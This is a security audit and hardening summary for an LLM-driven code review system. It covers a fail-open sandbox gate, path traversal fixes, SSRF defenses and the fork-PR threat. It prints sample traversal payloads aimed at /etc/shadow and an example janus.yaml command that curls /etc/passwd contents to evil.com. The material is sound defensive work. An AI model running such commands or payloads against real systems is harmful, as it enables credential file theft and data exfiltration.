# Janus Audit & Security Hardening Summary

During our session, we conducted a deep-dive analysis of the Janus Adversarial Code Review system, focusing on production readiness, operational security, concurrency, and deployments. The core architecture successfully implements the concepts outlined in the design (agent asymmetry, deterministic gates, and RAG). 

However, we uncovered and fixed several critical vulnerabilities and deployment blockers. Below is a detailed record of the findings and the actions taken.

## 🛠️ Critical Flaws Fixed

### 1. Silent Security Degradation (Fail-Open Gate Execution)
* **Location**: `core/gate.py`
* **The Flaw**: If `USE_CONTAINERIZED_GATE` was set to `true`, but the Docker daemon crashed, timed out, or was missing on the worker VM, the `_run` and `_run_containerized` functions would catch `FileNotFoundError` and **silently fall back to executing natively on the host**.
* **Impact**: If Docker became unavailable in production, the system would silently fail-open and begin running untrusted LLM-generated Python and tests natively on the host VM, completely destroying the security boundary without throwing an error.
* **The Fix**: Updated the logic to **fail securely (fail-closed)**. If containerization is enabled but Docker is unavailable, the gate now immediately raises an error and fails the patch.

### 2. Sandbox Escape / Arbitrary File Overwrite 
* **Location**: `core/gate.py` (`write_candidate_test`)
* **The Flaw**: The MCP tool exposed to the Reviewer agent appended the LLM-provided `filename` directly to the sandbox tests directory path without sanitization. 
* **Impact**: Because the Reviewer agent runs natively on the host worker (unlike the patch execution), if the LLM hallucinated or was tricked into outputting a filename like `../../../../etc/passwd` or `../../core/worker.py`, it would overwrite arbitrary host files using the worker's permissions.
* **The Fix**: Added a `.resolve()` and strict `.is_relative_to(repo_path)` validation to ensure the target test file is firmly inside the sandbox directory.

### 3. API Path Traversal / Arbitrary File Read
* **Location**: `core/orchestrator.py` (`run_debate`)
* **The Flaw**: The API endpoint `/debates` receives `target_file` from users and passes it into `run_debate`, which appended it directly to the sandbox path and read its contents.
* **Impact**: A malicious API caller could pass `target_file: "../../../etc/shadow"`, which the worker would read and pass into the prompt context for the LLM. The LLM could then leak the file contents through the API responses.
* **The Fix**: Added a `.resolve()` and `.is_relative_to(sandbox_resolved)` check for `target_file` right after the sandbox is instantiated, returning an error response if it attempts to escape the sandbox.

### 4. Massive Disk Space Exhaustion (Resource Leak)
* **Location**: `core/orchestrator.py` (`sandbox_copy`)
* **The Flaw**: The debate loop called `sandbox_copy()` which used `tempfile.mkdtemp` and `shutil.copytree` to copy the entire repository into `/tmp`. However, it **never deleted** this temporary directory. 
* **Impact**: Since this runs in a persistent background worker pulling from a queue, running 1,000 debates on a 100MB repository would silently leak 100GB of disk space, eventually crashing the worker host.
* **The Fix**: Wrapped the debate execution to ensure `shutil.rmtree(sandbox, ignore_errors=True)` is called upon all successful and failed exit paths to clean up the workspace.

### 5. Guaranteed CI/CD Pipeline Failure
* **Location**: `.github/workflows/deploy.yml`
* **The Flaw**: The pipeline featured a standalone `migrate` job that ran `python -c "from storage.db import run_migrations..."` directly on the **GitHub Actions runner**. 
* **Impact**: According to `docker-compose.prod.yml`, the PostgreSQL database is securely isolated inside the Docker network on the deployment VM and does not expose a public port. The GitHub Actions runner would have completely failed to connect to `${{ secrets.DATABASE_URL }}` and crashed the deployment pipeline every time.
* **The Fix**: Removed the standalone `migrate` job and moved the migration step into the `deploy` job. Now, it runs `docker compose run --rm api python -c "from storage.db import run_migrations..."` securely inside the private Docker network on the VM itself.

---

## 📦 Architecture Upgrades

### Extracted `janus-sandbox` Package
Recognizing the massive value of the secure, deterministic execution gate, we extracted it into a completely standalone Python package.
* **Location**: `packages/janus-sandbox/`
* **Features**: It is decoupled from the rest of the application, has its own `pyproject.toml`, and exposes a simple Python API to run untrusted code in a `--network none`, resource-capped container. 
* **Usage**: Can now be installed via GitHub `pip install git+https://github.com/CodeByD3v/Janus.git#subdirectory=packages/janus-sandbox` or published to PyPI for other AI developers to use.

---

## ✅ Audit Findings Closed Since This Review

The following items were open when this historical audit was written and are
now implemented and regression-tested:

1. **Server-Side Request Forgery and DNS rebinding in webhooks** — webhook
   destinations are resolved and validated against private, loopback,
   link-local, reserved, multicast, and unspecified ranges. A validated-IP
   Requests/urllib3 adapter pins the connection while preserving the original
   hostname for HTTP Host and HTTPS SNI validation; redirects and proxies are
   disabled.

2. **Zombie debate sessions** — the worker periodically runs
   `sweep_zombie_sessions`, which marks stale `running` sessions as `error`
   instead of leaving them indefinitely active or blindly retrying poisoned
   work.

3. **Async persistence and MCP lifecycle risk** — synchronous persistence,
   gate, sandbox, and database work is moved off the event loop; persistence
   has bounded timeouts, and MCP teardown uses shielded bounded cleanup. The
   regression suite covers event-loop continuity and teardown behavior. These
   controls mitigate the observed stall, but the underlying third-party
   MCP/event-loop root cause remains unconfirmed; a persistent environment is
   still required for optional `py-spy` diagnosis.

The historical flaw descriptions above remain useful as audit context; they
must not be read as the current security status of the repository.

## Verification boundary

The GitHub App implementation is covered by unit/regression tests in
`evals/eval_github_app.py`: signature verification, trigger parsing,
installation metadata validation, and file filtering are exercised with mocked
`_github_get` calls. A live end-to-end delivery through a real registered and
installed GitHub App, public webhook endpoint, and real repository has not yet
been performed. Closing that gap requires real external infrastructure and is
tracked as operational validation rather than an unimplemented code path.

---

## 🔄 Janus 2.0 Security Considerations

The following security considerations apply to the Janus 2.0 architecture changes:

### 1. Fork PR Security (NEW)
* **Context**: Janus 2.0 adds GitHub App integration with automatic and manual review triggers.
* **Risk**: PRs from forks are attacker-controlled. A malicious fork PR could contain crafted code designed to exploit the review process, extract secrets via the validation sandbox, or abuse LLM API quotas.
* **Mitigation**: Fork PRs are untrusted by default (Hard Rule 10). They MUST NOT trigger automatic reviews, run sandbox execution with merge authority, or access repository secrets. Read-only review mode is available only after explicit maintainer approval.

### 2. janus.yaml Command Injection (NEW)
* **Context**: janus.yaml allows repositories to define arbitrary shell commands for validation checks.
* **Risk**: A malicious janus.yaml could define commands like `command: curl http://evil.com/exfil?data=$(cat /etc/passwd)` as a 'lint' check.
* **Mitigation**: All validation commands run inside the same container-isolated sandbox as the existing gate (--network none, --read-only, resource-capped). The network isolation prevents data exfiltration. The fail-closed container policy applies: if Docker is unavailable, no commands execute.

### 3. BYOK Key Storage (NEW)
* **Context**: Enterprise users can bring their own LLM API keys.
* **Risk**: User-provided API keys must be stored securely. Plaintext storage or logging would violate Hard Rule 5.
* **Mitigation**: BYOK keys are encrypted at rest with the service credential boundary, decrypted only in worker memory when constructing the selected provider model, and never logged, returned in API responses, or written to repository configuration files. Janus API keys use one-way hashing because they are only validated; BYOK material must remain decryptable for provider calls.

### 4. Admin credential isolation (NEW)
* **Context**: Operators need cross-tenant visibility without weakening ordinary tenant isolation.
* **Mitigation**: `ADMIN_API_KEYS` is a separate, explicit role tier. Empty configuration disables admin access; tenant keys receive `403` on admin routes; admin keys are rejected by tenant authentication; and role collisions remove the credential rather than granting ambiguous privileges. Admin responses contain non-sensitive summaries only.

### 5. Multi-Provider Model Substitution

* **Context**: Different LLM providers have different safety profiles and capabilities.
* **Risk**: A model swap could change the Reviewer's behavior in ways that weaken the adversarial dynamic (e.g., a model that's too agreeable to approve everything).
* **Mitigation**: The deterministic gate remains the sole merge authority regardless of which model is used (Hard Rule 1). The model choice is invisible to the gate — it validates code correctness, not LLM output quality.
